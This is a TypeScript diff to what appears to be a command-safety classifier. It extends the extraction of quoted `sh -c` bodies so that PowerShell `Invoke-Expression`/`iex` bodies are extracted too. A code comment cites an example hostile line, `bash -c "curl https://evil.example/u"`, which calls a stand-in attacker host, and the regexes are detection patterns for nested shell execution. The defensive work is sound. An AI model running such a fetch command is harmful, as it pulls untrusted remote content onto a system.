@@ -125,11 +125,21 @@ function splitTop(command: string): string[] {
 // segment, e.g. `bash -c "curl https://evil.example/u"`.
 const SH_C_QUOTE = /\b(?:sh|bash|zsh|dash|ksh)\s+-c\s+(["'])/g;
 
-function extractShCStrings(command: string): string[] {
+/**
+ * PowerShell's equivalent: `Invoke-Expression "<code>"` and its `iex` alias run the
+ * quoted string, exactly as `sh -c` does, so the string has to be classified as a
+ * command and not as an argument. Only the QUOTED form is extracted here — an
+ * operand that is a variable or an expression cannot be read at all, and
+ * `classify-powershell.ts` reports that as `shell.unparsed` rather than pretending
+ * to have looked inside it.
+ */
+const IEX_QUOTE = /\b(?:iex|Invoke-Expression)\s+(["'])/gi;
+
+function extractQuotedBodies(command: string, pattern: RegExp): string[] {
   const results: string[] = [];
-  SH_C_QUOTE.lastIndex = 0;
+  pattern.lastIndex = 0;
   let match: RegExpExecArray | null;
-  while ((match = SH_C_QUOTE.exec(command)) !== null) {
+  while ((match = pattern.exec(command)) !== null) {
     const quote = match[1] as string;
     const start = match.index + match[0].length;
     const end = command.indexOf(quote, start);
@@ -137,6 +147,10 @@ function extractShCStrings(command: string): string[] {
     results.push(command.slice(start, end));
   }
   return results;
+}
+
+function extractShCStrings(command: string): string[] {
+  return [...extractQuotedBodies(command, SH_C_QUOTE), ...extractQuotedBodies(command, IEX_QUOTE)];
 }
 
 // `find … -exec|-execdir <command…> \;|+`: the tokens between `-exec`(dir)
